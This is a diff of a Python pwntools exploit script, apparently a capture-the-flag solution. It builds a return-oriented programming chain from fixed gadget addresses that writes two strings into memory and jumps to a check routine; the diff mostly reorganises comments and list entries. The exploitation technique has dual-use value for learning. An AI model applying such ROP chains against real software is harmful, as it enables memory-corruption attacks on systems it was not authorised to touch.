@@ -1,10 +1,14 @@
 from pwn import *
 
 context.arch = "amd64"
+context.terminal = ["tmux", "splitw", "-h"]
+
+# 0x00000000004020af : pop rdi ; ret
+# 0x0000000000485e8b : pop rdx ; pop rbx ; ret
+# 0x00000000004337e3 : mov qword ptr [rdi], rdx ; ret
 
 
 def main(r):
-    # context.terminal = ["tmux", "splitw", "-h"]
     # attach(
     #     r,
     #     """
@@ -20,10 +24,6 @@ def main(r):
 
     log.info(f"secret = {hex(secret)}")
 
-    # 0x00000000004020af : pop rdi ; ret
-    # 0x0000000000485e8b : pop rdx ; pop rbx ; ret
-    # 0x00000000004337e3 : mov qword ptr [rdi], rdx ; ret
-
     v1 = u64(b"kyoumoka")
     v2 = u64(b"waii".ljust(8, b"\x00"))
     # log.info(f"v1 = {p64(v1)}")
@@ -35,22 +35,17 @@ def main(r):
     ropc = flat(
         [
             #
-            0x00000000004020AF,  # pop rdi ; ret
-            0x4C7320,  # rdi = 0x4C7320
-            0x0000000000485E8B,  # pop rdx ; pop rbx ; ret
-            v1,  # rdx = "kyoumoka"
+            [0x00000000004020AF, 0x4C7320],  # pop rdi ; ret  # rdi = 0x4C7320
+            [0x0000000000485E8B, v1],  # pop rdx ; pop rbx ; ret  # rdx = "kyoumoka"
             0x4141414141414141,  # rbx = "AAAAAAA"
             0x00000000004337E3,  # mov qword ptr [rdi], rdx ; ret
             #
-            0x00000000004020AF,  # pop rdi ; ret
-            0x4C7320 + 8,  # rdi = 0x4C7328
-            0x0000000000485E8B,  # pop rdx ; pop rbx ; ret
-            v2,  # rdx = "waii"
+            [0x00000000004020AF, 0x4C7320 + 8],  # pop rdi ; ret  # rdi = 0x4C7328
+            [0x0000000000485E8B, v2],  # pop rdx ; pop rbx ; ret  # rdx = "waii"
             0x4141414141414141,  # rbx = "AAAAAAA"
             0x00000000004337E3,  # mov qword ptr [rdi], rdx ; ret
             #
-            0x00000000004020AF,  # pop rdi ; ret
-            0x4C7320,  # rdi = 0x4C7320
+            [0x00000000004020AF, 0x4C7320],  # pop rdi ; ret  # rdi = 0x4C7320
             0x4017BA,  # check address
         ]
     )
